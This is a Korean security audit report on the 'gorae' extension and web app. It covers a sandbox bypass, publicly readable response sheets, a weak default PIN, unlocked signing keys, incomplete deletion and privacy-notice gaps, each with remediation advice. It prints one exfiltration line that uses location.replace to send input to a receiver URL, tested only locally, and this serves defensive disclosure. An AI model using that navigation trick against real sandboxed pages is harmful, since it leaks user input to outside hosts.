점검일: 2026-10-02 (한국 시간)

대상: `codersongpro/gorae`, HEAD `5232d208c22bdcccd160e8478b349360449ef74c`. 확장앱 원본(`extension/`), 공용 코드(`shared/`), 웹 앱·뷰어·검수 도구(`site/`), 배포 설정 및 관련 테스트를 확인했다. 앱 코드는 수정하지 않았다.

## S01. HTML 격리는 전체 네트워크 차단을 보장하지 않음

근거: `extension/sandbox.js:8-28`, `site/viewer.js:14,44-50`, `site/review.js:183-187`, `shared/checker.js:6-9`.

`sandbox="allow-scripts"`와 CSP로 `fetch`, 저장소·부모 DOM 접근을 제한하지만, 작품이 **자기 프레임의 `location`을 변경하는 요청**은 수신 서버에 도착한다. `iframe.csp`로 최종 화면 표시가 거부되어도 요청 URL은 이미 전송된다.

로컬 서버 두 개를 서로 다른 포트에 띄워 origin을 분리하고 Edge `154.0.4258.48`에서 다음을 확인했다. 사용자 개인정보와 운영 서버를 사용하지 않았다.

| 실행 경로 | `fetch` 요청 | 자기 프레임 이동 |
| --- | --- | --- |
| 웹 앱의 실제 `sandbox.js` | CSP가 차단, 수신 없음 | `/collect?value=synthetic-sandbox` 수신 |
| 실제 `viewer.js` 실행 버튼 | CSP가 차단, 수신 없음 | `/collect?value=synthetic-viewer` 수신 |

시험에서 사용한 이동의 핵심은 다음과 같다. 주소는 로컬 시험 수신 서버였다.

```js
location.replace(receiverUrl + '?value=' + encodeURIComponent(input.value));
```

자동 점검도 `location.replace`를 포함한 합성 HTML에 `{ ok: true, warnings: [] }`를 반환했다. 점검은 정규식 경고이며 보안 경계로 사용할 수 없다. `importEntry`는 외부 전송·이메일 입력 경고가 있는 파일도 저장한다(`extension/core/market.js:130-141`). 문서의 “자동 점검을 통과해야 저장”이라는 표현도 실제 동작에 맞춰야 한다.

**권장:** `extension/ui/strings.js:150,299`의 완전 차단 안내를 즉시 보정하고, 작품에 민감한 입력을 하지 않도록 안내한다. 완전한 차단이 필요하면 실행 환경에서 탐색 요청까지 **발신 전에** 차단하는 정책을 설계하고 실제 브라우저로 검증한다. 웹 실행은 임의 JavaScript를 허용한 채 CSP만으로 전체 외부 통신을 차단했다고 보장하지 않는다. `location` 문자열 탐지나 이동 후 iframe 제거만으로 해결했다고 판단하지 않는다.

확장앱 manifest의 sandbox는 별도 보호가 있으므로 웨일 확장앱에서의 동일한 우회는 이번 점검에서 재현하지 않았다. 검수 미리보기는 같은 정책의 코드가 확인되었지만 해당 UI에서 직접 재현한 것은 아니다.

참고: [MDN connect-src](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/connect-src), [MDN iframe sandbox](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe).

## S02. 검토용 원응답 시트의 공개

근거: `extension/core/market-config.js:3-6`, `shared/market.js:154-161`, `extension/core/config.js:13-15`, `docs/google-form.md:34-45`.

문서는 원응답 비공개 → 검토한 작품을 `공개목록` 탭에 옮김 → 운영자 소유 사본 공개를 권장한다. 실제 설정은 `publishedCsvUrl`이 비어 있고 원응답 시트 ID를 사용한다. 공개용 탭을 따로 구성했더라도 원응답 전체를 읽을 수 있다면 보호 경계가 성립하지 않는다.

현재 설정된 두 시트에 쿠키·로그인 없이 `export?format=csv`로 GET 요청한 결과:

| 시트 | HTTP | CSV 공개 | 헤더 외 응답 행 수 | 이메일·실명 전용 열 |
| --- | --- | --- | --- | --- |
| 나눔 곳간 | 200 | 가능 | 2 | 탐지되지 않음 |
| 물뿜기·고래 노래 | 200 | 가능 | 16 | 탐지되지 않음 |

응답 본문·업로드 파일·제출자 신원을 출력하거나 보고서에 복사하지 않았다. **이메일이 현재 유출됐다고 확인한 것은 아니다.** 다만 별명·설명·주소·후기 자유 입력에 실명이나 연락처가 들어가면 검토 전에 노출되는 구조다. 후기와 물뿜기가 같은 공개 시트를 사용하므로 “작품 ID와 역할만 쌓인다”는 문서 설명도 정확하지 않다(`extension/core/submit.js:69-78`). 업로드 원본 소유자 노출 여부는 별도로 확인해야 한다.

**권장:** 원응답 시트의 공개 공유를 해제하고 검토한 필드만 담은 공개 전용 시트/CSV를 사용한다. `MARKET.publishedCsvUrl`을 해당 CSV로 바꾸고 `sheetId`를 비우며, `sheetCsvUrls`에서 비공개 원응답으로의 fallback을 제거한다. `CONFIG.spoutCsvUrl`도 검토된 집계 전용 공개 자료로 바꾸고 `spoutSheetId` fallback을 제거한다. 후기 원문은 비공개 검수 자료로 분리한다. 공개 파일은 개인정보 확인 후 운영자 소유 사본으로 제공한다.

시트 공개 해제 전에 대체 목록을 준비해 앱 목록 기능의 중단을 피한다. “삭제” 요청은 공개 행뿐 아니라 Forms 원응답·Drive 원본·공개 사본에도 적용할 수 있어야 한다.

## S03. 교사 PIN은 권한 검증이 아니라 편의상 모드 잠금

근거: `extension/core/pin.js:47-59`, `extension/sidebar.js:518-530,610-615`, `extension/ui/views.js:554-556`.

- 최초 실행 시 기본 PIN `1234`를 자동 설정한다. 실제 함수 실행에서 이 값으로 인증 성공했다.
- “암호를 잊었어요 → 암호 지우기”는 기존 PIN이나 다른 인증 없이 실행된다. 기존 PIN을 지우고 새 PIN으로 인증하는 흐름을 재현했다.
- 교사 모드가 로컬에 저장되고 앱 재실행 때 복원된다. 공유 PC의 다음 사용자가 PIN 없이 교사 모드를 이어 쓸 수 있다.

코드 주석도 PIN을 학생 앞의 실수 방지 수준으로 설명한다. 이를 서버 인증이나 검수자 자격 증명으로 해석하면 안 된다. 교사 모드 진입으로 검수 전자서명 자체를 위조할 수 있는 것은 아니다.

**권장:** 기본 PIN 자동 생성을 제거하고 최초에 직접 설정하게 한다. 기본 시작 모드는 학생으로 두며, 명시적 재인증·사용 종료 잠금을 제공한다. 무인증 재설정을 유지한다면 보호 한계를 UI에 설명한다. 실제 교사 권한 확인이 필요한 업무는 별도의 인증 경계가 필요하다.

## S04. 검수 키의 사용을 잠그지 않음

근거: `site/review.js:19-36,99-101,190-192,361-364`.

개인키가 non-extractable인 것은 좋지만 **내보내기 금지와 사용 권한 검증은 다르다.** 검수 도구는 저장된 키를 시작 시 바로 불러오며, 서명 때 암호 재입력이나 별도 잠금 해제가 없다. 공유 브라우저 프로필을 사용하는 사람은 검수 도구에서 기존 검수자의 키를 사용할 수 있다.

합성 키를 `gorae-review`에 저장한 뒤 같은 origin의 다른 경로(`/app/run.html`)에서 읽어 서명했고, 공개키 검증에 성공했다. `extractable: false` 상태가 유지되어도 서명은 가능했다. 실제 검수자의 키를 읽거나 서명하지 않았다.

GitHub Pages의 `/gorae/`, `/다른저장소/`는 경로가 달라도 동일한 호스트 origin을 공유할 수 있다. 해당 origin의 다른 앱에 XSS나 악성 코드가 실행되면 키의 서명 기능을 악용할 수 있다. **그런 XSS가 현재 존재하거나 공격이 일어났다는 증거는 발견하지 않았다.** 격리된 작품 iframe이 곧바로 키 저장소에 접근한 것도 아니다.

**권장:** 검수 도구는 공개 앱과 다른 origin으로 분리하거나 전용 로컬 환경·브라우저 프로필에서 사용한다. 저장 시 암호화된 백업을 보관하고 세션마다 암호를 입력해 개인키를 메모리로만 불러오는 방식을 검토한다. 잠금·잠금 해제·키 삭제 기능을 제공하고 공유 PC 사용을 피한다. 잠금 해제 동안 실행되는 같은 origin의 스크립트 위험은 남으므로 origin 분리도 필요하다.

참고: [MDN CryptoKey.extractable](https://developer.mozilla.org/en-US/docs/Web/API/CryptoKey/extractable), [MDN SubtleCrypto의 키 저장](https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto#storing_keys).

## S05. 삭제가 모든 로컬 사본에 적용되지 않음

근거: `extension/sidebar.js:357-359`, `extension/core/runtab.js:3-17`, `extension/core/market.js:85-94`.

작품 삭제는 내 곳간 IndexedDB 기록만 삭제한다. 최근 실행 작품 10개를 HTML 전체와 함께 보관하는 `runTickets`에는 남는다. 실제로 작품을 저장·실행표 발급·작품 삭제한 뒤 저장소에서는 사라졌지만 실행표에서 같은 작품을 다시 읽을 수 있었다. 최근 10개 제한은 시간 만료나 삭제 보장이 아니다.

`marketCache`도 시트 CSV 원문을 기간 제한 없이 보관하고 네트워크 실패 때 재사용한다. 공개목록에서 삭제한 작품이 오프라인 이용자의 캐시에 남을 수 있다. 내려받은 꾸러미·링크 수신자 사본은 앱에서 원격 삭제할 수 없다.

**권장:** 작품 삭제 시 관련 실행표도 제거하고 실행표에 짧은 만료 시간을 둔다. 전체 로컬 데이터 삭제 메뉴로 내 곳간·캐시·실행표·별명·대기 전송 기록을 함께 정리한다. 캐시에는 TTL을 적용한다. 사용자 안내에 기기 삭제, 공개자료 삭제, 이미 공유한 사본의 한계를 구분한다.

## S06. 개인정보 안내와 실제 흐름의 불일치

근거: `site/index.html:121`, `extension/ui/strings.js:161,269-273`, `extension/core/submit.js:16-46,69-78`, `shared/submission.js:13-19`, `shared/market.js:166-181`, `extension/core/spout-sync.js:20-25,69-80`.

소개 페이지의 “로그인도 개인정보 저장도 없어요. 작품과 설정은 내 기기에만 저장돼요”는 공유·폼 이용과 구분되지 않는다. 나눔 공유 시 별명·설명·주소가 Google 폼 URL의 query에 포함되며, HTML 맨 앞 주석에는 작성자와 프롬프트 레시피를 포함한 메타데이터가 붙는다. 사용자가 실명이나 학생 정보·API 키를 넣으면 체크박스만으로 걸러지지 않는다.

파일 업로드에 구글 로그인이 필요하다는 안내는 이미 있다. 프로젝트 운영 문서에는 업로드 때 계정 정보 기록·파일 소유자 표시의 위험도 적혀 있지만, 앱 공유 화면에는 데이터의 저장·공개 범위와 삭제 절차가 충분히 설명되지 않는다.

물뿜기는 자동 POST되며 실패한 기록을 다음 실행 때 다시 보낸다. `credentials: 'omit'`은 쿠키 전송을 줄이지만 익명 네트워크를 만드는 것은 아니다. Google은 서비스 접속 때 IP·브라우저·요청 시각 등의 정보를 수집한다고 설명한다. [Google 개인정보처리방침](https://policies.google.com/privacy?hl=ko).

**권장:** 사용 화면에 로컬 저장 항목, Google 전송 항목·시점, 공개 대상·검토 과정, 보관 기간, 삭제 요청 창구, 사용자 선택을 설명한다. 미전송 기록을 사용자가 확인·취소할 수 있게 한다. 자유 입력·HTML·레시피의 개인정보와 비밀값 점검을 보강하되 자동 탐지가 완전하다고 안내하지 않는다. 소개 문구는 “계정 없이 시작, 작품은 기본적으로 기기에 저장, 공유·추천 시 외부 서비스 이용”처럼 실제 흐름을 반영한다.

## S07. 물뿜기 집계 위조

근거: `shared/spout.js:16-36,79-99`, `extension/core/spout-sync.js:20-25,31-41`.

중복 검사는 보고 번호 기준이며 기기·역할 인증이나 서명 검증은 없다. 새로운 보고 번호 3개를 합성해 같은 작품에 교사 추천 3회로 집계되는 것을 재현했다. 취소 보고도 해당 추천을 제출한 주체인지 검증하지 않는다. 시험은 함수 안에서만 했으며 운영 폼에 제출하지 않았다.

이는 개인정보 침해보다 지표 신뢰성 문제다. 숫자가 선정·검수 우선순위에 쓰이면 조작이 영향을 준다.

**권장:** 인증을 도입하지 않는 운영 방식을 유지한다면 숫자를 익명 응원 참고 지표로 설명하고 선정 기준으로 과도하게 사용하지 않는다. 원문 공개 없이 운영자가 이상 보고를 검토·집계하게 한다. 강한 중복·역할 검증이 필요하면 신뢰할 수 있는 제출 검증 경계를 마련해야 하며, 개인정보 수집 증가와의 절충을 검토한다.

## S08. 테스트 키와 운영 신뢰 기준 분리

근거: `extension/core/rootkey.js:1-2`, `tools/build-sample.mjs:14-39,87-91`, `.gitignore:1-5`.

현재 내장 관리 공개키가 로컬 `tests/keys/root.public.jwk`와 일치한다. 샘플 생성 스크립트는 추출 가능한 테스트 개인키를 로컬 파일로 만들고 `site/catalog.json`, `site/reviewers.json`, 내장 관리 공개키를 덮어쓴다. 족보 버전도 1로 고정되어 있다.

테스트 개인키는 Git 추적 대상에서 제외되어 있었고, 현재 Git 추적 파일에서 개인 JWK·개인키 파일의 커밋은 확인되지 않았다. **테스트 키 사용 자체가 이미 공개된 개인키나 암호 알고리즘의 취약성을 뜻하지 않는다.** 운영 검수 권한과 테스트 키의 구분·보관 수준이 불분명한 것이 문제다.

**권장:** 운영 키를 별도로 생성·보관하고 신뢰 파일과 샘플 생성 산출 경로를 분리한다. 운영 파일에 테스트 키가 들어가는 것을 배포 검사에서 거부한다. 키 교체 시 기존 작품 서명 재발급·족보 버전 전환 계획도 함께 마련한다. 무조건 `build:sample`을 실행해 운영 파일을 재생성하지 않는다.

## 확인된 방어와 검증 범위

- 기존 단위 테스트: `node --test "tests/*.test.mjs"`, **134개 통과, 실패 0**.
- 원본·웹 복사본: `node tools/sync.mjs --check`, 종료 코드 0. 읽기 전용 검사로 동기화를 변경하지 않았다.
- ECDSA P-256/SHA-256 작품 전체 해시, 관리 서명·검수자 등록·말소·족보 버전 검사와 변조 관련 기존 테스트가 존재하고 통과했다.
- 브라우저 합성 HTML의 부모 DOM 접근과 `localStorage` 기록은 모두 차단되었다. `allow-same-origin`이 없는 격리의 효과는 확인됐다.
- UI DOM 도우미는 사용자 문자열을 텍스트 노드로 넣는다. 검토한 작품 메타데이터 표시 경로에서 직접적인 `innerHTML` 주입은 발견하지 않았다.
- 폼·다운로드 URL은 HTTPS 검사, Drive 호스트 검사, 다운로드 시간·크기 제한, 쿠키 제외가 있다. 리다이렉트 검사는 자동 follow 후 최종 주소 검사이며 각 hop을 요청 전에 막는 것은 아니다.
- 검수 키 백업은 PBKDF2-SHA256 310,000회와 AES-GCM, 무작위 salt·IV를 사용한다.
- `package.json`에 외부 패키지 의존성과 타입체크·일반 앱 빌드 스크립트가 없다. `build:sample`은 신뢰 파일을 바꾸는 생성 작업이라 실행하지 않았다.
- 운영 뷰어 HTTP 200을 확인했고 응답에 CSP·X-Frame-Options·Referrer-Policy 헤더는 없었다. 작품 iframe CSP와는 별개로 앱 본체의 방어를 강화할 여지가 있지만 헤더 부재만으로 XSS가 있다고 판단하지 않는다.
- 환경변수로 관리하는 서버 비밀값은 발견되지 않았다. `CONFIG`, `MARKET`의 폼·시트 ID와 내장 공개키는 공개 설정이며 비밀키가 아니다. 서버/API 인증 체계를 전제로 한 점검은 이 앱 구조에 해당하지 않는다.

웨일 확장앱 실제 실행, 업로드 원본의 소유자 정보, 폼 관리자 설정·응답 보관 정책, 같은 호스트의 다른 저장소 전체, Git 과거 이력의 비밀값, 삭제 요청 처리 운영 절차는 검증하지 않았다. 법적 적합성 판정도 포함하지 않는다.

## 권장 실행 순서

1. 네트워크 유출 가능성을 사용자 안내에 즉시 반영하고, 완전 차단이 필요한 사용 범위와 실행 환경을 결정한다.
2. 검토용 원응답은 비공개로 전환하고, 검토한 목록·집계만 담은 공개 자료로 설정을 교체한다.
3. 공유 PC의 검수 키 사용을 중단하고 별도 origin·프로필과 세션 잠금을 마련한다.
4. 기본 PIN 제거·학생 모드 시작, 삭제와 캐시 만료, 외부 전송·보관·삭제 안내를 보강한다.
5. 테스트 신뢰 키를 운영 키와 분리하고, 수정 후 위 우회·삭제·권한·비공개 시트 fallback에 대한 회귀 검증을 추가한다.

이번 점검은 보고서 작성과 시험만 수행했다. 앱 코드, Google 공유 설정, 폼 응답, 운영 키, 배포 상태는 변경하지 않았다.
